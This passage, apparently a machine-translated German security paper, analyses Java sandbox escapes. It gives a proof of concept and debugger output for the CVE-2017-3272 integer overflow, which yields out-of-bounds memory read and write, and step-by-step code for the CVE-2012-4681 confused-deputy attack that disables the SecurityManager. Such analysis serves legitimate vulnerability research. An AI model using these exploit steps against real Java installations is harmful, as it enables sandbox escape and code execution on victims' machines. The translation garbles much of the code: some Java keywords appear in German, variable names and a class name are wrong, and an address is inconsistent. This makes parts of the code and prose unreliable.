<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">803</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">copyToIntArray</span><span class="params">(<span class="keyword">long</span> srcAddr, Object dst,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">804</span>:                                      <span class="keyword">long</span> dstPos, <span class="keyword">long</span> length)</span></span>;</span><br></pre></td></tr></table></figure>
<p>　Der C-Code für diese Methode ist unten gezeigt.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">175</span>: JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="number">176</span>: Java_java_nio_Bits_copyToIntArray(JNIEnv *env, jobject <span class="keyword">this</span>,</span><br><span class="line"><span class="number">177</span>:                                   jlong srcAddr, jobject dst,</span><br><span class="line">                                      jlong dstPos, jlong length)</span><br><span class="line"><span class="number">178</span>: &#123;</span><br><span class="line"><span class="number">179</span>:     jbyte *bytes;</span><br><span class="line"><span class="number">180</span>:     <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="number">181</span>:     jint *srcInt, *dstInt, *endInt;</span><br><span class="line"><span class="number">182</span>:     jint tmpInt;</span><br><span class="line"><span class="number">183</span>:</span><br><span class="line"><span class="number">184</span>:     srcInt = (jint *)jlong_to_ptr(srcAddr);</span><br><span class="line"><span class="number">185</span>:</span><br><span class="line"><span class="number">186</span>:     <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">187</span>:         <span class="comment">/* do not change this code, see WARNING above */</span></span><br><span class="line"><span class="number">188</span>:         <span class="keyword">if</span> (length &gt; MBYTE)</span><br><span class="line"><span class="number">189</span>:             size = MBYTE;</span><br><span class="line"><span class="number">190</span>:         <span class="keyword">else</span></span><br><span class="line"><span class="number">191</span>:             size = (<span class="keyword">size_t</span>)length;</span><br><span class="line"><span class="number">192</span>:</span><br><span class="line"><span class="number">193</span>:         GETCRITICAL(bytes, env, dst);</span><br><span class="line"><span class="number">194</span>:</span><br><span class="line"><span class="number">195</span>:         dstInt = (jint *)(bytes + dstPos);</span><br><span class="line"><span class="number">196</span>:         endInt = srcInt + (size / <span class="keyword">sizeof</span>(jint));</span><br><span class="line"><span class="number">197</span>:         <span class="keyword">while</span> (srcInt &lt; endInt) &#123;</span><br><span class="line"><span class="number">198</span>:             tmpInt = *srcInt++;</span><br><span class="line"><span class="number">199</span>:             *dstInt++ = SWAPINT(tmpInt);</span><br><span class="line"><span class="number">200</span>:         &#125;</span><br><span class="line"><span class="number">201</span>:</span><br><span class="line"><span class="number">202</span>:         RELEASECRITICAL(bytes, env, dst, <span class="number">0</span>);</span><br><span class="line"><span class="number">203</span>:</span><br><span class="line"><span class="number">204</span>:         length -= size;</span><br><span class="line"><span class="number">205</span>:         srcAddr += size;</span><br><span class="line"><span class="number">206</span>:         dstPos += size;</span><br><span class="line"><span class="number">207</span>:     &#125;</span><br><span class="line"><span class="number">208</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Wir haben festgestellt, dass der Array-Index nicht überprüft wurde. Wenn der Index kleiner als null oder größer als oder gleich der Array-Größe ist, wird der Code ebenfalls ausgeführt. Der Code konvertiert zuerst long in einen 32-Bit-Ganzzahlzeiger (Zeile 184). Der Code wird dann wiederholt, bis das Längen- / Größenelement kopiert ist (Zeilen 186 und 204). Aufrufe von GETCRITICAL () und RELEASECRITICAL () (Zeilen 193 und 202) werden verwendet, um den Zugriff auf das dst-Array zu synchronisieren, so dass es unabhängig von der Überprüfung des Index des Arrays ist.<br>Um diesen nativen Code auszuführen, müssen Sie die drei Bedingungen erfüllen, die in der Java-Methode get () existieren:</p>
<ul>
<li>Einschränkung 1:<br><code>356: if (((lange) Länge &lt;&lt; 2)&gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) {</code></li>
<li>Einschränkung 2:<br><code>357: checkBounds (Offset, Länge, src.length);</code></li>
<li>Einschränkung 3:<br><code>362: if (length&gt; rem)</code></li>
</ul>
<p>Wir haben die Behauptung in Zeile 360 nicht erwähnt, weil wir nur überprüft haben, ob in der VM die Option “-ea” (Aktivierung der Aktivierung) gesetzt wurde. Das ist in der Produktion so gut wie nie passiert, weil es eine Verlangsamung verursacht.<br>In der ersten Einschränkung stellt JNI_COPY_FROM_ARRAY_THRESHOLD den Schwellenwert dar, ab dem die Kopie durch systemeigenen Code abgeschlossen wurde (die Anzahl der zu kopierenden Elemente). Oracle hat empirisch festgestellt, dass es sich lohnt, nativen Code aus sechs Elementen aufzurufen. Um diese Einschränkung zu erfüllen, muss die Anzahl der zu kopierenden Elemente größer als 1 (6 &gt;&gt; 2) sein.<br>Die zweite Einschränkung erscheint in der checkBounds () -Methode:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">564</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkBounds</span><span class="params">(<span class="keyword">int</span> off, <span class="keyword">int</span> len, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line"><span class="number">566</span>:        <span class="keyword">if</span> ((off | len | (off + len) | (size - (off + len))) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">567</span>:            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException();</span><br><span class="line"><span class="number">568</span>:    &#125;</span><br></pre></td></tr></table></figure>
<p>　　Die zweite Einschränkung kann wie folgt ausgedrückt werden:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  offset &gt; <span class="number">0</span> AND length &gt; <span class="number">0</span> AND (offset + length) &gt; <span class="number">0</span></span><br><span class="line"><span class="number">2</span>:  AND (dst.length - (offset + length)) &gt; <span class="number">0</span>.</span><br></pre></td></tr></table></figure>
<p>Die dritte Bedingung überprüft, ob die Anzahl der verbleibenden Elemente kleiner oder gleich der Anzahl der zu kopierenden Elemente ist:<br><code>Länge &lt;lim - pos &#39;
Der Einfachheit halber nehmen wir an, dass der aktuelle Index des Arrays 0 ist. Dann wird die Bedingung:</code>Länge &lt;lim<br>Das ist das Gleiche<br><code>Länge &lt;dst.length</code><br>Die Lösung für diese Einschränkungen ist:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  Dst.length = 1209098507</span><br><span class="line">  Versatz = 1073741764</span><br><span class="line">  Länge = 2</span><br></pre></td></tr></table></figure>
<p>Mit dieser Lösung sind alle Einschränkungen erfüllt, und aufgrund des Integer-Überlaufs können wir 8 Bytes (2 * 4) am negativen Exponenten -240 lesen (1073741764 &lt;&lt; 2). Wir haben jetzt ein Lese-Primitiv, um die Bytes vor dem dst-Array zu lesen. Mit der gleichen Technik für die Methode get () erhalten wir ein Primitiv, das Bytes vor dem Array dst schreibt.<br>Wir können überprüfen, ob unsere Analyse korrekt ist, indem wir ein einfaches PoC schreiben und es auf einer anfälligen JVM-Version ausführen (z. B. Java 1.8 Update 60).</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>:  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:</span><br><span class="line"> <span class="number">3</span>:    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> <span class="number">4</span>:      <span class="keyword">int</span>[] dst = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1209098507</span>];</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dst.length; i++) &#123;</span><br><span class="line"> <span class="number">7</span>:        dst[i] = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line"> <span class="number">8</span>:      &#125;</span><br><span class="line"> <span class="number">9</span>:</span><br><span class="line"><span class="number">10</span>:      <span class="keyword">int</span> bytes = <span class="number">400</span>;</span><br><span class="line"><span class="number">11</span>:      ByteBuffer bb = ByteBuffer.allocateDirect(bytes);</span><br><span class="line"><span class="number">12</span>:      IntBuffer ib = bb.asIntBuffer();</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ib.limit(); i++) &#123;</span><br><span class="line"><span class="number">15</span>:        ib.put(i, <span class="number">0xBBBBBBBB</span>);</span><br><span class="line"><span class="number">16</span>:      &#125;</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:      <span class="keyword">int</span> offset = <span class="number">1073741764</span>; <span class="comment">// offset &lt;&lt; 2 = -240</span></span><br><span class="line"><span class="number">19</span>:      <span class="keyword">int</span> length = <span class="number">2</span>;</span><br><span class="line"><span class="number">20</span>:</span><br><span class="line"><span class="number">21</span>:      ib.get(dst, offset, length); <span class="comment">// breakpoint here</span></span><br><span class="line"><span class="number">22</span>:    &#125;</span><br><span class="line"><span class="number">23</span>:</span><br><span class="line"><span class="number">24</span>:  &#125;</span><br></pre></td></tr></table></figure>
<p>Dieser Code erstellt ein Array der Größe 1209098507 (Zeile 4) und initialisiert dann alle Elemente dieses Arrays auf 0xAAAAAAAA (Zeilen 6-8). Es erstellt dann eine Instanz des Typs IntBuffer und initialisiert alle Elemente (Integer) seines internen Arrays auf 0xBBBBBBBB (Zeilen 10-16). Schließlich ruft es die Methode get () auf, um 2 Elemente aus dem internen Array von ib mit einem negativen Offset von -240 (Zeilen 18-21) nach dst zu kopieren. Die Ausführung dieses Codes führt nicht zum Absturz der VM. Außerdem haben wir festgestellt, dass die Elemente des dst-Arrays nach dem Aufruf von get nicht geändert wurden. Dies bedeutet, dass die 2 Elemente aus dem ib internen Array außerhalb von dst kopiert wurden. Lassen Sie uns dies überprüfen, indem Sie in Zeile 21 einen Haltepunkt setzen und dann gdb beim Ausführen der JVM starten. Im Java-Code verwenden wir sun.misc.Unsafe, um die Adresse von dst zu berechnen, die 0x20000000 ist.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -p 1234</span><br><span class="line">[...]</span><br><span class="line">(gdb) x/10x 0x200000000</span><br><span class="line">0x200000000:	0x00000001	0x00000000	0x3f5c025e	0x4811610b</span><br><span class="line">0x200000010:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa</span><br><span class="line">0x200000020:	0xaaaaaaaa	0xaaaaaaaa</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff20:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff30:	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<p>Mit gdb haben wir festgestellt, dass die Elemente des dst-Arrays wie erwartet auf 0xAAAAAAAA initialisiert wurden. Das Array startet nicht direkt von 0xAAAAAAAA, sondern hat stattdessen einen 16-Byte-Header, der die Größe des Arrays enthält (0x4811610b = 1209098507). Jetzt gibt es nichts (nur Nullbytes) von 240 Bytes vor dem Array. Lassen Sie uns die Methode get Java ausführen und überprüfen Sie den Speicherzustand erneut mit gdb:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">Thread 1 &quot;java&quot; received signal SIGINT, Interrupt.</span><br><span class="line">0x00007fb208ac86cd in pthread_join (threadid=140402604672768,</span><br><span class="line">  thread_return=0x7ffec40d4860) at pthread_join.c:90</span><br><span class="line">90	in pthread_join.c</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x1ffffff20:	0xbbbbbbbb	0xbbbbbbbb	0x00000000	0x00000000</span><br><span class="line">0x1ffffff30:	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<p>Eine Kopie der beiden Elemente von ibs internem Array nach dst “work”: Sie werden 240 Bytes vor dem ersten Element von dst kopiert. Aus irgendeinem Grund ist das Programm nicht abgestürzt. Das Anzeigen der Speicherzuordnung eines Prozesses zeigt an, dass vor 0x20000000 ein Speicherbereich vorhanden ist, dh rwx:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pmap 1234</span><br><span class="line">[...]</span><br><span class="line">00000001fc2c0000  62720K rwx--   [ anon ]</span><br><span class="line">0000000200000000 5062656K rwx--   [ anon ]</span><br><span class="line">0000000335000000 11714560K rwx--   [ anon ]</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>Wie unten beschrieben, ist in type confusion in Java ein Synonym für die Sandbox-Gesamtumgehung angegeben. Die Idee der Schwachstelle CVE-2017-3272 besteht darin, Typ-Phrasierungs-Primitive zu verwenden, um eine Typ-Konfusion durchzuführen. Unser Ziel ist es, folgende Struktur im Gedächtnis zu haben:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  B[] |0|1|............|k|......|l|</span><br><span class="line">  A[] |0|1|2|....|i|................|m|</span><br><span class="line">int[] |0|..................|j|....|n|</span><br></pre></td></tr></table></figure>
<p>Ein Array von Elementen vom Typ _B_, dem ein Array von Elementen vom Typ _A_ vor dem internen Array des <em>IntBuffer</em>-Objekts vorausgeht. Der erste Schritt besteht darin, das Lese-Grundelement zu verwenden, um die Adresse des Elements von _A_ (Index i) innerhalb des inneren Integer-Arrays (Index j) zu kopieren. Der zweite Schritt beinhaltet das Kopieren der Referenz vom inneren Array (am Index j) zum Element vom Typ _B_ (am Index k). Nach Abschluss dieser beiden Schritte betrachtet die JVM das Element am Index k als einen _B_ -Typ, ist jedoch tatsächlich ein Element vom Typ _A_.<br>Der Code zum Behandeln des Heapspeichers ist komplex und kann von VM zu VM (Hotspot, JRockit usw.) oder von Version zu Version geändert werden. Wir haben eine stabile Situation erreicht, in der alle drei Arrays für 50 verschiedene Versionen der JVM mit den folgenden Array-Größen nebeneinander liegen:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = 429496729</span><br><span class="line">m = 1</span><br><span class="line">n = 858993458</span><br></pre></td></tr></table></figure>
<h5 id="3-2-3-Diskussion"><a href="#3-2-3-Diskussion" class="headerlink" title="3.2.3 Diskussion"></a>3.2.3 Diskussion</h5><p>Wir haben Schwachstellen in allen öffentlich verfügbaren Versionen von Java 1.6, 1.7 und 1.8 getestet. Insgesamt sind 51 Versionen anfällig: 18 Versionen von 1.6 (1.6_23 bis 1.6_45), 28 Versionen von 1.7 (1.7_0 bis 1.7_80) und 5 Versionen von 1.8 (1.8_05 bis 1.8_60).<br>Wir haben den obigen Patch bereits besprochen: Der Patch-Code konvertiert nun zuerst eine 32-Bit-Ganzzahl in eine lange Ganzzahl, bevor die Verschiebeoperation ausgeführt wird. Dies verhindert effektiv einen Ganzzahlüberlauf.</p>
<h3 id="4-Java-Level-Schwachstelle"><a href="#4-Java-Level-Schwachstelle" class="headerlink" title="4 Java Level Schwachstelle"></a>4 Java Level Schwachstelle</h3><h4 id="4-1-Verwirrung-Agent"><a href="#4-1-Verwirrung-Agent" class="headerlink" title="4.1 Verwirrung Agent"></a>4.1 Verwirrung Agent</h4><h5 id="4-1-1-Hintergrund"><a href="#4-1-1-Hintergrund" class="headerlink" title="4.1.1 Hintergrund"></a>4.1.1 Hintergrund</h5><p>Verwirrte Proxy-Angriffe sind eine sehr häufige Art von Angriffen auf die Java-Plattform. Die Beispielangriffe sind CVE-2012-5088, CVE-2012-5076, CVE-2013-2460 und CVE-2012-4681-Angriffe, die wir im Folgenden detailliert beschreiben werden. Die Grundidee besteht darin, mithilfe von Code auf Felder einer privaten Methode oder Systemklasse zuzugreifen, z. B. um den Sicherheitsmanager zu deaktivieren. Der Sicherheitsanfälligkeitscode greift jedoch nicht direkt auf die erforderlichen Klassenmitglieder zu, sondern führt stattdessen den Zugriff für vertrauenswürdige Systemklassen durch. Ein typisches Verfahren zum Missbrauch einer Systemklasse für diesen Zweck besteht darin, eine Reflektion oder die unsichere Verwendung von MethodHandles zu verwenden, dh die Klasse des vertrauenswürdigen Systems führt einen umgekehrten Lesezugriff durch, der vom Analytiker auf dem Zielfeld bestimmt werden kann.</p>
<h5 id="4-1-2-Beispiel-CVE-2012-4681"><a href="#4-1-2-Beispiel-CVE-2012-4681" class="headerlink" title="4.1.2 Beispiel: CVE-2012-4681"></a>4.1.2 Beispiel: CVE-2012-4681</h5><p>Wir werden CVE-2012-4681 betrachten, weil dies oft von anderen Autoren als Beispiel für einen verwirrenden Proxy-Angriff bezeichnet wird.<br>Als ersten Schritt rufen wir den Zugriff auf <em>sun.awt.SunToolkit</em> ab, bei dem es sich um eine eingeschränkte Klasse handelt, und auf nicht vertrauenswürdigen Code sollte nicht zugegriffen werden können.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">1</span>: Ausdruck expr0 = <span class="function">neuer <span class="title">Ausdruck</span> <span class="params">(Class.class, forName,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="number">2</span>: neues Objekt [] &#123;<span class="string">"sun.awt.SunToolkit"</span>&#125;)</span></span>;</span><br><span class="line">  <span class="number">3</span>: Klasse sunToolkit = (Klasse) expr.execute (). GetValue ();</span><br></pre></td></tr></table></figure>
<p>Dies hat die Sicherheitsanfälligkeit ausgenutzt. Selbst wenn wir Class.forName () als Zielmethode für Ausdruck angeben, wird diese Methode nicht wirklich aufgerufen. Stattdessen implementiert <em>Expression</em> benutzerdefinierte Logik speziell für diesen Fall, der die Klasse lädt, ohne die Zugriffsrechte ordnungsgemäß zu überprüfen. Daher ist <em>Expression</em> hier als unser Verschleierungsagent, der eine Klasse lädt, die wir nicht laden dürfen.<br>Als nächstes verwenden wir SunToolkit.getField (), um auf das private Feld Statement.acc zuzugreifen.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Expression expr1 = <span class="keyword">new</span> Expression(sunToolkit, <span class="string">"getField"</span>,</span><br><span class="line"><span class="number">2</span>: 	<span class="keyword">new</span> Object[] &#123;Statement.class, <span class="string">"acc"</span>&#125;);</span><br><span class="line"><span class="number">3</span>: Field acc = expr1.execute().getValue();</span><br></pre></td></tr></table></figure>
<p>getField () ist ein weiterer Verschleierungsagent, mit dem ich reflektiven Zugriff auf private Felder der Systemklasse bekomme. Das folgende Codefragment zeigt, dass getField () doPrivileged () verwendet, um das angeforderte Feld abzurufen und so festzulegen, dass es zugänglich ist, damit der Wert später geändert werden kann.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class klass,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">2</span>: 	<span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line"> <span class="number">3</span>:  <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line"> <span class="number">4</span>: 	<span class="keyword">new</span> PrivilgedAction&lt;Field&gt;() &#123;</span><br><span class="line"> <span class="number">5</span>: 		<span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>: 		...</span><br><span class="line"> <span class="number">7</span>: 			Field field = klass.getDeclaredField(fieldName);</span><br><span class="line"> <span class="number">8</span>: 			...</span><br><span class="line"> <span class="number">9</span>: 			field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">10</span>: 			<span class="keyword">return</span> field;</span><br><span class="line"><span class="number">11</span>: 		...</span><br></pre></td></tr></table></figure>
<p>　　Als Nächstes erstellen wir einen <em>AccessControlContext</em>, dem alle Berechtigungen zugewiesen sind.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Permissions permissions = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">2</span>: permissions.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">3</span>: ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(</span><br><span class="line"><span class="number">4</span>: 	<span class="keyword">new</span> URL(<span class="string">"file:///"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), permissions);</span><br><span class="line"><span class="number">5</span>: AccessControlContext newAcc =</span><br><span class="line"><span class="number">6</span>: 	AccessControlContext(<span class="keyword">new</span> ProtectionDomain[] &#123;pd&#125;);</span><br></pre></td></tr></table></figure>
<p>Das <em>Statement</em> -Objekt kann einen beliebigen Methodenaufruf darstellen. Wenn die <em>Statement</em>-Instanz erstellt wird, speichert sie den aktuellen Sicherheitskontext in Statement.acc. Wenn Statement.execute () aufgerufen wird, führt es den Aufruf aus, den es in dem ursprünglich in Statement.acc gespeicherten Sicherheitskontext darstellt, um sicherzustellen, dass es die Methode mit den gleichen Berechtigungen aufruft, wie sie es direkt aufruft.<br>Als Nächstes erstellen wir ein <em>Statement</em>, das System.setSecurityManager (null) aufruft und den in Statement.acc gespeicherten <em>AccessControlContext</em> mit einem neuen <em>AccessControlContext</em> mit allen Berechtigungen überschreibt.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Statement stmt = <span class="keyword">new</span> Statement(System.class, <span class="string">"setSecurityManager"</span>,</span><br><span class="line"><span class="number">2</span>: 	<span class="keyword">new</span> Object[<span class="number">1</span>]);</span><br><span class="line"><span class="number">3</span>: acc.set(stmt, newAcc)</span><br></pre></td></tr></table></figure>
<p>Schließlich rufen wir stmt.execute () auf, um den Aufruf von setSecurityManager () tatsächlich auszuführen. Dieser Aufruf ist erfolgreich, da der Sicherheitskontext in stmt.acc durch den Sicherheitskontext ersetzt wurde, dem alle Berechtigungen zugewiesen wurden.</p>
<h5 id="4-1-3-Diskussion"><a href="#4-1-3-Diskussion" class="headerlink" title="4.1.3 Diskussion"></a>4.1.3 Diskussion</h5><p>Das chaotische Proxy-Angriffsproblem beruht natürlich auf dem Kernkonzept der Java-Plattformsicherheit. Ein Schlüsselmechanismus für das Sandboxing ist die stapelbasierte Zugriffssteuerung, die den Aufrufstapel überprüft, wenn sensible Vorgänge versucht werden, direkten Zugriff zu erkennen, z. B. von nicht vertrauenswürdigem Code auf sensible Klassenmitglieder. In vielen Fällen wird diese Stapelüberprüfung jedoch beendet, bevor überprüft wird, ob alle Aufrufer auf dem aktuellen Stapel über die entsprechenden Berechtigungen verfügen. Es gibt zwei häufige Situationen, in denen dies passiert. Im ersten Fall ruft ein Aufrufer auf dem Stapel doPrivileged () auf, um explizit zu deklarieren, dass die erforderliche Operation als sicher betrachtet wird, selbst wenn sie aus nicht-privilegiertem Code aufgerufen wird. Und doPrivileged () ist normalerweise ein sinnvoller Mechanismus und kann missbraucht werden, ohne alle Vorsichtsmaßnahmen zu treffen, um die Sicherheit einer bestimmten Operation zu gewährleisten. Im zweiten Fall wird das Verfahren nur in der Systemklasse sein Attribut direkt manuell Partei Anrufe überprüfen und Zugriffskontrollmechanismen des JVM skip, auf den anderen Anrufern den Stapel Mechanismus überprüfen. In beiden Fällen kann der Analytiker von einer unvollständigen Stapelüberquerung profitieren, indem er einfach einige sensible Operationen im Auftrag der Systemklasse ausführt.</p>
<h4 id="4-2-Nicht-initialisierte-Instanz"><a href="#4-2-Nicht-initialisierte-Instanz" class="headerlink" title="4.2 Nicht initialisierte Instanz"></a>4.2 Nicht initialisierte Instanz</h4><h5 id="4-2-1-Hintergrund"><a href="#4-2-1-Hintergrund" class="headerlink" title="4.2.1 Hintergrund"></a>4.2.1 Hintergrund</h5><p>Der Schlüsselschritt bei der Initialisierung eines Java-Objekts besteht darin, den Konstruktor des entsprechenden Typs aufzurufen. Der Konstruktor enthält den erforderlichen Code für die Initialisierung der Variablen, kann jedoch auch Sicherheitsprüfungen enthalten. Aus diesem Grund ist es für Plattformsicherheit und Stabilität wichtig, den Aufruf des Konstruktors zu erzwingen, bevor die Objektinitialisierung abgeschlossen ist und anderer Code diesen Typ aufruft.<br>Der Aufruf des Ausführungskonstruktors liegt in der Verantwortung des Bytecode-Verifizierers, der beim Laden alle Klassen überprüft, um ihre Gültigkeit sicherzustellen. Dazu gehört beispielsweise auch, zu prüfen, ob der Sprung auf einen gültigen Befehl und nicht in die Mitte des Befehls fällt, und zu prüfen, ob der Steuerfluß mit einem Rücksprungbefehl endet. Darüber hinaus prüft es, ob der Befehl auf einem gültigen Typ ausgeführt wird, was notwendig ist, um Typ-verwirrende Angriffe zu verhindern, die wir in Abschnitt 3.1.1 eingeführt haben.<br>Um die Typvalidität zu überprüfen, verwendet die JVM zur Berechnung der Fixpunkte in der Vergangenheit eine Datenflussanalyse. Diese Analyse erfordert möglicherweise mehrere Durchläufe auf demselben Pfad. Da dies zeitaufwändig ist und den Ladevorgang der Klasse verlangsamen kann, wurde eine neue Methode entwickelt, um eine Typüberprüfung in linearer Zeit durchzuführen, wobei jeder Pfad nur einmal überprüft wird. Zu diesem Zweck werden Metainformationen, die als Stapelkartenrahmen bezeichnet werden, entlang des Bytecodes hinzugefügt. Kurz gesagt, die Stack-Map-Box beschreibt die möglichen Typen jedes Verzweigungsziels. Der Stapelkartenrahmen ist in einer Struktur gespeichert, die Stapelkarte genannt wird.<br>Wann kann der Analytiker eine Instanz erstellen, um einen Anruf <init> (*) werden auf diese Instanz nicht ausgeführt wird, treten der Betrieb des Objektkonstruktor Konstruktor oder übergeordnete Klasse, nicht initialisierte Instanz Schwachstellen. Diese Sicherheitsanfälligkeit verletzt direkt die Spezifikationen der virtuellen Maschine. Die Auswirkung auf die JVM-Sicherheit besteht darin, dass ein Analyst für nicht initialisierte Instanzschwachstellen ein Objekt instanziieren kann, auf das er nicht zugreifen sollte, und auf Eigenschaften und Methoden zugreifen kann, auf die er nicht zugreifen sollte. Dadurch kann die Sandbox entkommen.</init></p>
